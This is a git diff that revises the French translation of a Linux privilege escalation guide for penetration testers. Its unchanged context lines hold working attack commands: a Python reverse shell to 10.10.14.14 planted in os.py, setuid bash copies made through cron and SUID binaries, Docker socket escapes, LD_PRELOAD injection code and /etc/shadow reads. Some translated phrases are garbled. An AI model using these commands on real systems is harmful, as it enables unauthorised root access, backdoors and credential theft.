@@ -1,10 +1,10 @@
-# Linux Privilege Escalation
+# Escalade de privilèges Linux
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Informations système
 
-### Infos sur le système d'exploitation
+### Informations sur le système d'exploitation
 
 Commençons par acquérir des connaissances sur le système d'exploitation en cours d'exécution
 ```bash
@@ -18,7 +18,7 @@ Si vous **avez des permissions d'écriture sur un dossier à l'intérieur de la 
 ```bash
 echo $PATH
 ```
-### Env info
+### Infos sur l'environnement
 
 Informations intéressantes, mots de passe ou clés API dans les variables d'environnement ?
 ```bash
@@ -168,7 +168,7 @@ ps aux
 ps -ef
 top -n 1
 ```
-Toujours vérifier les [**débogueurs electron/cef/chromium**] en cours d'exécution, vous pourriez en abuser pour élever vos privilèges](electron-cef-chromium-debugger-abuse.md). **Linpeas** les détecte en vérifiant le paramètre `--inspect` dans la ligne de commande du processus.\
+Vérifiez toujours les [**débogueurs electron/cef/chromium**] en cours d'exécution, vous pourriez en abuser pour élever vos privilèges](electron-cef-chromium-debugger-abuse.md). **Linpeas** les détecte en vérifiant le paramètre `--inspect` dans la ligne de commande du processus.\
 Vérifiez également **vos privilèges sur les binaires des processus**, peut-être pouvez-vous écraser quelqu'un.
 
 ### Surveillance des processus
@@ -281,7 +281,7 @@ Si vous constatez que le processus d'authentification est en cours d'exécution 
 ps -ef | grep "authenticator"
 root      2027  2025  0 11:46 ?        00:00:00 authenticator
 ```
-Vous pouvez dumper le processus (voir les sections précédentes pour trouver différentes façons de dumper la mémoire d'un processus) et rechercher des identifiants à l'intérieur de la mémoire :
+Vous pouvez extraire le processus (voir les sections précédentes pour trouver différentes façons d'extraire la mémoire d'un processus) et rechercher des identifiants à l'intérieur de la mémoire :
 ```bash
 ./dump-memory.sh 2027
 strings *.dump | grep -i password
@@ -290,14 +290,14 @@ strings *.dump | grep -i password
 
 L'outil [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) va **voler des identifiants en texte clair depuis la mémoire** et depuis certains **fichiers bien connus**. Il nécessite des privilèges root pour fonctionner correctement.
 
-| Fonctionnalité                                      | Nom du Processus     |
+| Fonctionnalité                                      | Nom du processus      |
 | --------------------------------------------------- | --------------------- |
 | Mot de passe GDM (Kali Desktop, Debian Desktop)     | gdm-password          |
 | Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)   | gnome-keyring-daemon  |
 | LightDM (Ubuntu Desktop)                            | lightdm               |
-| VSFTPd (Connexions FTP Actives)                     | vsftpd                |
-| Apache2 (Sessions HTTP Basic Auth Actives)          | apache2               |
-| OpenSSH (Sessions SSH Actives - Utilisation de Sudo) | sshd:                 |
+| VSFTPd (Connexions FTP actives)                     | vsftpd                |
+| Apache2 (Sessions HTTP Basic Auth actives)          | apache2               |
+| OpenSSH (Sessions SSH actives - Utilisation de Sudo) | sshd:                 |
 
 #### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
 ```bash
@@ -313,9 +313,9 @@ Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
 # finding secrets
 # results in /tmp/tmp.o6HV0Pl3fe/results.txt
 ```
-## Scheduled/Cron jobs
+## Tâches planifiées/Cron
 
-Vérifiez si un travail planifié est vulnérable. Peut-être pouvez-vous tirer parti d'un script exécuté par root (vulnérabilité par joker ? peut modifier des fichiers utilisés par root ? utiliser des liens symboliques ? créer des fichiers spécifiques dans le répertoire utilisé par root ?).
+Vérifiez si une tâche planifiée est vulnérable. Peut-être pouvez-vous tirer parti d'un script exécuté par root (vulnérabilité par joker ? peut modifier des fichiers utilisés par root ? utiliser des liens symboliques ? créer des fichiers spécifiques dans le répertoire utilisé par root ?).
 ```bash
 crontab -l
 ls -al /etc/cron* /etc/at*
@@ -356,7 +356,7 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
 #Wait until it is executed
 /tmp/bash -p
 ```
-Si le script exécuté par root utilise un **répertoire où vous avez un accès complet**, il pourrait être utile de supprimer ce dossier et **de créer un dossier de lien symbolique vers un autre** servant un script contrôlé par vous.
+Si le script exécuté par root utilise un **répertoire où vous avez un accès total**, il pourrait être utile de supprimer ce dossier et **de créer un dossier de symlink vers un autre** servant un script contrôlé par vous.
 ```bash
 ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
 ```
@@ -372,7 +372,7 @@ for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; do
 
 ### Tâches cron invisibles
 
-Il est possible de créer un cronjob **en mettant un retour chariot après un commentaire** (sans caractère de nouvelle ligne), et le cron job fonctionnera. Exemple (notez le caractère de retour chariot) :
+Il est possible de créer une tâche cron **en mettant un retour chariot après un commentaire** (sans caractère de nouvelle ligne), et la tâche cron fonctionnera. Exemple (notez le caractère de retour chariot) :
 ```bash
 #This is a comment inside a cron config file\r* * * * * echo "Surprise!"
 ```
@@ -405,7 +405,7 @@ Ensuite, créez un **exécutable** avec le **même nom que le binaire du chemin 
 
 ## **Timers**
 
-Les **Timers** sont des fichiers d'unité systemd dont le nom se termine par `**.timer**` qui contrôlent les fichiers ou événements `**.service**`. Les **Timers** peuvent être utilisés comme une alternative à cron car ils ont un support intégré pour les événements de temps calendaire et les événements de temps monotone et peuvent être exécutés de manière asynchrone.
+Les **Timers** sont des fichiers d'unité systemd dont le nom se termine par `**.timer**` qui contrôlent les fichiers ou événements `**.service**`. Les **Timers** peuvent être utilisés comme une alternative à cron car ils ont un support intégré pour les événements de temps calendaire et les événements de temps monotoniques et peuvent être exécutés de manière asynchrone.
 
 Vous pouvez énumérer tous les timers avec :
 ```bash
@@ -413,13 +413,13 @@ systemctl list-timers --all
 ```
 ### Timers modifiables
 
-Si vous pouvez modifier un minuteur, vous pouvez le faire exécuter certaines instances de systemd.unit (comme un `.service` ou un `.target`)
+Si vous pouvez modifier un timer, vous pouvez le faire exécuter certaines instances de systemd.unit (comme un `.service` ou un `.target`)
 ```bash
 Unit=backdoor.service
 ```
 Dans la documentation, vous pouvez lire ce qu'est l'unité :
 
-> L'unité à activer lorsque ce minuteur expire. L'argument est un nom d'unité, dont le suffixe n'est pas ".timer". Si non spécifié, cette valeur par défaut est un service qui a le même nom que l'unité de minuteur, sauf pour le suffixe. (Voir ci-dessus.) Il est recommandé que le nom de l'unité qui est activée et le nom de l'unité de minuteur soient nommés de manière identique, sauf pour le suffixe.
+> L'unité à activer lorsque ce minuteur expire. L'argument est un nom d'unité, dont le suffixe n'est pas ".timer". Si non spécifié, cette valeur par défaut est un service qui a le même nom que l'unité de minuteur, sauf pour le suffixe. (Voir ci-dessus.) Il est recommandé que le nom de l'unité qui est activée et le nom de l'unité du minuteur soient nommés de manière identique, sauf pour le suffixe.
 
 Par conséquent, pour abuser de cette permission, vous devez :
 
@@ -454,7 +454,7 @@ Les sockets peuvent être configurés à l'aide de fichiers `.socket`.
 ### Fichiers .socket écrits
 
 Si vous trouvez un fichier `.socket` **écrit**, vous pouvez **ajouter** au début de la section `[Socket]` quelque chose comme : `ExecStartPre=/home/kali/sys/backdoor` et la porte dérobée sera exécutée avant que le socket ne soit créé. Par conséquent, vous devrez **probablement attendre que la machine redémarre.**\
-_&#x4E;otez que le système doit utiliser cette configuration de fichier socket ou la porte dérobée ne sera pas exécutée_
+_Notez que le système doit utiliser cette configuration de fichier socket ou la porte dérobée ne sera pas exécutée_
 
 ### Sockets écrits
 
@@ -498,7 +498,7 @@ Si vous avez un accès en écriture au socket Docker, vous pouvez élever les pr
 docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
 docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
 ```
-Ces commandes vous permettent d'exécuter un conteneur avec un accès de niveau root au système de fichiers de l'hôte.
+Ces commandes vous permettent d'exécuter un conteneur avec un accès au niveau root au système de fichiers de l'hôte.
 
 #### **Utilisation directe de l'API Docker**
 
@@ -532,13 +532,13 @@ Connection: Upgrade
 Upgrade: tcp
 ```
 
-Après avoir configuré la connexion `socat`, vous pouvez exécuter des commandes directement dans le conteneur avec un accès de niveau root au système de fichiers de l'hôte.
+Après avoir configuré la connexion `socat`, vous pouvez exécuter des commandes directement dans le conteneur avec un accès au niveau root au système de fichiers de l'hôte.
 
 ### Autres
 
-Notez que si vous avez des permissions d'écriture sur le socket docker parce que vous êtes **dans le groupe `docker`**, vous avez [**plus de moyens d'escalader les privilèges**](interesting-groups-linux-pe/index.html#docker-group). Si l'[**API docker écoute sur un port**, vous pouvez également être en mesure de la compromettre](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
+Notez que si vous avez des permissions d'écriture sur le socket docker parce que vous êtes **dans le groupe `docker`**, vous avez [**plus de façons d'escalader les privilèges**](interesting-groups-linux-pe/index.html#docker-group). Si l'[**API docker écoute sur un port**, vous pouvez également être en mesure de la compromettre](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
 
-Vérifiez **plus de moyens de sortir de docker ou de l'abuser pour escalader les privilèges** dans :
+Vérifiez **plus de façons de sortir de docker ou de l'abuser pour escalader les privilèges** dans :
 
 {{#ref}}
 docker-security/
@@ -653,7 +653,7 @@ gpg --list-keys 2>/dev/null
 ```
 ### Big UID
 
-Certaines versions de Linux ont été affectées par un bug qui permet aux utilisateurs avec **UID > INT_MAX** d'escalader les privilèges. Plus d'infos : [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) et [here](https://twitter.com/paragonsec/status/1071152249529884674).\
+Certaines versions de Linux ont été affectées par un bug qui permet aux utilisateurs avec **UID > INT_MAX** d'escalader les privilèges. Plus d'infos : [ici](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [ici](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) et [ici](https://twitter.com/paragonsec/status/1071152249529884674).\
 **Exploitez-le** en utilisant : **`systemd-run -t /bin/bash`**
 
 ### Groups
@@ -687,8 +687,8 @@ Si vous **connaissez un mot de passe** de l'environnement, **essayez de vous con
 
 ### Su Brute
 
-Si vous ne vous souciez pas de faire beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur l'ordinateur, vous pouvez essayer de brute-forcer l'utilisateur en utilisant [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
-[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) avec le paramètre `-a` essaie également de brute-forcer les utilisateurs.
+Si vous ne vous souciez pas de faire beaucoup de bruit et que les binaires `su` et `timeout` sont présents sur l'ordinateur, vous pouvez essayer de forcer le mot de passe de l'utilisateur en utilisant [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
+[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) avec le paramètre `-a` essaie également de forcer les mots de passe des utilisateurs.
 
 ## Abus de PATH écrivable
 
@@ -753,7 +753,7 @@ Si un **wildcard** est utilisé (\*), c'est encore plus facile :
 sudo less /var/log/../../etc/shadow #Read shadow
 sudo less /var/log/something /etc/shadow #Red 2 files
 ```
-**Contre-mesures** : [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)
+**Contre-mesures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)
 
 ### Commande Sudo/Binaire SUID sans chemin de commande
 
@@ -776,7 +776,7 @@ Par exemple, si un binaire suid appelle _**/usr/sbin/service apache2 start**_, v
 function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
 export -f /usr/sbin/service
 ```
-Ensuite, lorsque vous appelez le binaire suid, cette fonction sera exécutée
+Alors, lorsque vous appelez le binaire suid, cette fonction sera exécutée
 
 ### LD_PRELOAD & **LD_LIBRARY_PATH**
 
@@ -814,7 +814,7 @@ Enfin, **escalader les privilèges** en exécutant
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
 > [!CAUTION]
-> Une privesc similaire peut être abusée si l'attaquant contrôle la variable d'environnement **LD_LIBRARY_PATH** car il contrôle le chemin où les bibliothèques vont être recherchées.
+> Une privesc similaire peut être exploitée si l'attaquant contrôle la variable d'environnement **LD_LIBRARY_PATH** car il contrôle le chemin où les bibliothèques vont être recherchées.
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -834,7 +834,7 @@ cd /tmp
 gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
 sudo LD_LIBRARY_PATH=/tmp <COMMAND>
 ```
-### Binaire SUID – injection .so
+### SUID Binary – .so injection
 
 Lorsqu'on rencontre un binaire avec des permissions **SUID** qui semble inhabituel, il est bon de vérifier s'il charge correctement les fichiers **.so**. Cela peut être vérifié en exécutant la commande suivante :
 ```bash
@@ -853,7 +853,7 @@ void inject(){
 system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
-Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions de fichiers et en exécutant un shell avec des privilèges élevés.
+Ce code, une fois compilé et exécuté, vise à élever les privilèges en manipulant les permissions de fichier et en exécutant un shell avec des privilèges élevés.
 
 Compilez le fichier C ci-dessus en un fichier d'objet partagé (.so) avec :
 ```bash
@@ -939,7 +939,7 @@ sudo su
 bash exploit_v2.sh
 /tmp/sh -p
 ```
-- Le **troisième exploit** (`exploit_v3.sh`) va **créer un fichier sudoers** qui rend **les tokens sudo éternels et permet à tous les utilisateurs d'utiliser sudo**
+- Le **troisième exploit** (`exploit_v3.sh`) va **créer un fichier sudoers** qui rend **les jetons sudo éternels et permet à tous les utilisateurs d'utiliser sudo**
 ```bash
 bash exploit_v3.sh
 sudo su
@@ -954,7 +954,7 @@ Par exemple, si vous pouvez écraser le fichier _/var/run/sudo/ts/sampleuser_ et
 ### /etc/sudoers, /etc/sudoers.d
 
 Le fichier `/etc/sudoers` et les fichiers à l'intérieur de `/etc/sudoers.d` configurent qui peut utiliser `sudo` et comment. Ces fichiers **par défaut ne peuvent être lus que par l'utilisateur root et le groupe root**.\
-**Si** vous pouvez **lire** ce fichier, vous pourriez être en mesure d'**obtenir des informations intéressantes**, et si vous pouvez **écrire** un fichier, vous serez en mesure d'**escalader les privilèges**.
+**Si** vous pouvez **lire** ce fichier, vous pourriez être en mesure d'**obtenir des informations intéressantes**, et si vous pouvez **écrire** dans n'importe quel fichier, vous serez en mesure d'**escalader les privilèges**.
 ```bash
 ls -l /etc/sudoers /etc/sudoers.d/
 ls -ld /etc/sudoers.d/
@@ -979,11 +979,11 @@ permit nopass demo as root cmd vim
 ```
 ### Sudo Hijacking
 
-Si vous savez qu'un **utilisateur se connecte généralement à une machine et utilise `sudo`** pour élever ses privilèges et que vous avez obtenu un shell dans ce contexte utilisateur, vous pouvez **créer un nouvel exécutable sudo** qui exécutera votre code en tant que root puis la commande de l'utilisateur. Ensuite, **modifiez le $PATH** du contexte utilisateur (par exemple en ajoutant le nouveau chemin dans .bash_profile) afin que lorsque l'utilisateur exécute sudo, votre exécutable sudo soit exécuté.
+Si vous savez qu'un **utilisateur se connecte généralement à une machine et utilise `sudo`** pour élever les privilèges et que vous avez obtenu un shell dans ce contexte utilisateur, vous pouvez **créer un nouvel exécutable sudo** qui exécutera votre code en tant que root puis la commande de l'utilisateur. Ensuite, **modifiez le $PATH** du contexte utilisateur (par exemple en ajoutant le nouveau chemin dans .bash_profile) afin que lorsque l'utilisateur exécute sudo, votre exécutable sudo soit exécuté.
 
 Notez que si l'utilisateur utilise un shell différent (pas bash), vous devrez modifier d'autres fichiers pour ajouter le nouveau chemin. Par exemple, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifie `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Vous pouvez trouver un autre exemple dans [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)
 
-Ou exécuter quelque chose comme :
+Ou en exécutant quelque chose comme :
 ```bash
 cat >/tmp/sudo <<EOF
 #!/bin/bash
@@ -1006,7 +1006,7 @@ Le fichier `/etc/ld.so.conf` indique **d'où proviennent les fichiers de configu
 
 Cela signifie que les fichiers de configuration de `/etc/ld.so.conf.d/*.conf` seront lus. Ces fichiers de configuration **pointent vers d'autres dossiers** où **les bibliothèques** vont être **recherchées**. Par exemple, le contenu de `/etc/ld.so.conf.d/libc.conf` est `/usr/local/lib`. **Cela signifie que le système recherchera des bibliothèques à l'intérieur de `/usr/local/lib`**.
 
-Si pour une raison quelconque **un utilisateur a des permissions d'écriture** sur l'un des chemins indiqués : `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, tout fichier à l'intérieur de `/etc/ld.so.conf.d/` ou tout dossier dans le fichier de configuration à l'intérieur de `/etc/ld.so.conf.d/*.conf`, il peut être en mesure d'escalader les privilèges.\
+Si pour une raison quelconque **un utilisateur a des permissions d'écriture** sur l'un des chemins indiqués : `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, tout fichier à l'intérieur de `/etc/ld.so.conf.d/` ou tout dossier dans le fichier de configuration à l'intérieur de `/etc/ld.so.conf.d/*.conf`, il pourrait être en mesure d'escalader les privilèges.\
 Jetez un œil à **comment exploiter cette mauvaise configuration** dans la page suivante :
 
 {{#ref}}
@@ -1077,8 +1077,8 @@ getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ```
 ## Ouvrir des sessions shell
 
-Dans les **anciennes versions**, vous pouvez **dérober** certaines sessions **shell** d'un autre utilisateur (**root**).\
-Dans les **dernières versions**, vous ne pourrez **vous connecter** qu'aux sessions d'écran de **votre propre utilisateur**. Cependant, vous pourriez trouver **des informations intéressantes à l'intérieur de la session**.
+Dans **les anciennes versions**, vous pouvez **dérober** certaines sessions **shell** d'un autre utilisateur (**root**).\
+Dans **les versions les plus récentes**, vous ne pourrez **vous connecter** qu'aux sessions d'écran de **votre propre utilisateur**. Cependant, vous pourriez trouver **des informations intéressantes à l'intérieur de la session**.
 
 ### Détournement de sessions d'écran
 
@@ -1117,7 +1117,7 @@ rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs c
 # If you are root or devs you can access it
 tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
 ```
-Vérifiez **Valentine box from HTB** pour un exemple.
+Vérifiez la **boîte de Saint-Valentin de HTB** pour un exemple.
 
 ## SSH
 
@@ -1158,12 +1158,12 @@ Vous devez définir cette option dans `$HOME/.ssh.config` comme ceci :
 Host example.com
 ForwardAgent yes
 ```
-Remarquez que si `Host` est `*`, chaque fois que l'utilisateur passe à une autre machine, cet hôte pourra accéder aux clés (ce qui est un problème de sécurité).
+Remarquez que si `Host` est `*`, chaque fois que l'utilisateur passe à une autre machine, cet hôte pourra accéder aux clés (ce qui pose un problème de sécurité).
 
 Le fichier `/etc/ssh_config` peut **remplacer** ces **options** et autoriser ou interdire cette configuration.\
-Le fichier `/etc/sshd_config` peut **autoriser** ou **interdire** le transfert de l'agent ssh avec le mot-clé `AllowAgentForwarding` (la valeur par défaut est autoriser).
+Le fichier `/etc/sshd_config` peut **autoriser** ou **interdire** le transfert de l'agent ssh avec le mot-clé `AllowAgentForwarding` (la valeur par défaut est autorisée).
 
-Si vous constatez que le Forward Agent est configuré dans un environnement, lisez la page suivante car **vous pourriez être en mesure de l'exploiter pour élever les privilèges** :
+Si vous constatez que le Forward Agent est configuré dans un environnement, lisez la page suivante car **vous pourriez être en mesure de l'exploiter pour élever vos privilèges** :
 
 {{#ref}}
 ssh-forward-agent-exploitation.md
@@ -1173,7 +1173,7 @@ ssh-forward-agent-exploitation.md
 
 ### Fichiers de profils
 
-Le fichier `/etc/profile` et les fichiers sous `/etc/profile.d/` sont **des scripts qui sont exécutés lorsqu'un utilisateur lance un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier l'un d'eux, vous pouvez élever les privilèges**.
+Le fichier `/etc/profile` et les fichiers sous `/etc/profile.d/` sont **des scripts qui sont exécutés lorsqu'un utilisateur lance un nouveau shell**. Par conséquent, si vous pouvez **écrire ou modifier l'un d'eux, vous pouvez élever vos privilèges**.
 ```bash
 ls -l /etc/profile /etc/profile.d/
 ```
@@ -1188,7 +1188,7 @@ cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 #Shadow equivalent files
 cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
 ```
-Dans certaines occasions, vous pouvez trouver des **hashs de mot de passe** à l'intérieur du fichier `/etc/passwd` (ou équivalent).
+Dans certaines occasions, vous pouvez trouver des **hashes de mot de passe** à l'intérieur du fichier `/etc/passwd` (ou équivalent).
 ```bash
 grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
 ```
@@ -1227,7 +1227,7 @@ ExecStart=/path/to/backdoor
 User=root
 Group=root
 ```
-Votre porte dérobée sera exécutée la prochaine fois que tomcat sera démarré.
+Votre backdoor sera exécutée la prochaine fois que tomcat sera démarré.
 
 ### Vérifier les Dossiers
 
@@ -1310,18 +1310,18 @@ Pour **lire les journaux, le groupe** [**adm**](interesting-groups-linux-pe/inde
 ~/.zlogin #zsh shell
 ~/.zshrc #zsh shell
 ```
-### Recherche de crédentiels génériques/Regex
+### Generic Creds Search/Regex
 
 Vous devriez également vérifier les fichiers contenant le mot "**password**" dans son **nom** ou à l'intérieur du **contenu**, et également vérifier les IP et les emails dans les logs, ou les regexps de hachages.\
 Je ne vais pas lister ici comment faire tout cela, mais si vous êtes intéressé, vous pouvez consulter les dernières vérifications que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) effectue.
 
-## Fichiers écriture
+## Writable files
 
-### Détournement de bibliothèque Python
+### Python library hijacking
 
-Si vous savez **d'où** un script python va être exécuté et que vous **pouvez écrire dans** ce dossier ou que vous pouvez **modifier les bibliothèques python**, vous pouvez modifier la bibliothèque OS et y insérer un backdoor (si vous pouvez écrire là où le script python va être exécuté, copiez et collez la bibliothèque os.py).
+Si vous savez **d'où** un script python va être exécuté et que vous **pouvez écrire dans** ce dossier ou que vous pouvez **modifier les bibliothèques python**, vous pouvez modifier la bibliothèque OS et y ajouter une porte dérobée (si vous pouvez écrire là où le script python va être exécuté, copiez et collez la bibliothèque os.py).
 
-Pour **insérer un backdoor dans la bibliothèque**, ajoutez simplement à la fin de la bibliothèque os.py la ligne suivante (changez IP et PORT) :
+Pour **ajouter une porte dérobée à la bibliothèque**, ajoutez simplement à la fin de la bibliothèque os.py la ligne suivante (changez IP et PORT) :
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
@@ -1354,15 +1354,15 @@ NAME=Network /bin/id
 ONBOOT=yes
 DEVICE=eth0
 ```
-### **init, init.d, systemd, et rc.d**
+### **init, init.d, systemd et rc.d**
 
 Le répertoire `/etc/init.d` est le foyer des **scripts** pour System V init (SysVinit), le **système de gestion de services Linux classique**. Il comprend des scripts pour `start`, `stop`, `restart`, et parfois `reload` des services. Ceux-ci peuvent être exécutés directement ou via des liens symboliques trouvés dans `/etc/rc?.d/`. Un chemin alternatif dans les systèmes Redhat est `/etc/rc.d/init.d`.
 
 D'autre part, `/etc/init` est associé à **Upstart**, un **système de gestion de services** plus récent introduit par Ubuntu, utilisant des fichiers de configuration pour les tâches de gestion des services. Malgré la transition vers Upstart, les scripts SysVinit sont toujours utilisés aux côtés des configurations Upstart en raison d'une couche de compatibilité dans Upstart.
 
-**systemd** émerge comme un gestionnaire d'initialisation et de services moderne, offrant des fonctionnalités avancées telles que le démarrage de démons à la demande, la gestion de l'automontage, et des instantanés de l'état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les paquets de distribution et `/etc/systemd/system/` pour les modifications administratives, rationalisant le processus d'administration système.
+**systemd** émerge comme un gestionnaire d'initialisation et de services moderne, offrant des fonctionnalités avancées telles que le démarrage de démons à la demande, la gestion de l'automontage et des instantanés de l'état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les paquets de distribution et `/etc/systemd/system/` pour les modifications administratives, rationalisant le processus d'administration système.
 
-## Autres Astuces
+## Autres astuces
 
 ### Escalade de privilèges NFS
 
@@ -1382,7 +1382,7 @@ escaping-from-limited-bash.md
 cisco-vmanage.md
 {{#endref}}
 
-## Protections de Sécurité du Noyau
+## Protections de sécurité du noyau
 
 - [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
 - [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)
@@ -1397,14 +1397,14 @@ cisco-vmanage.md
 
 **LinEnum** : [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
 **Enumy** : [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
-**Vérification Privesc Unix :** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
-**Vérificateur de privilèges Linux :** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
+**Unix Privesc Check :** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
+**Linux Priv Checker :** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
 **BeeRoot :** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
 **Kernelpop :** Énumérer les vulnérabilités du noyau dans linux et MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
 **Mestaploit :** _**multi/recon/local_exploit_suggester**_\
-**Suggesteur d'Exploitation Linux :** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
+**Linux Exploit Suggester :** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
 **EvilAbigail (accès physique) :** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
-**Recueil de plus de scripts** : [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
+**Recopilation de plus de scripts** : [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)
 
 ## Références
 
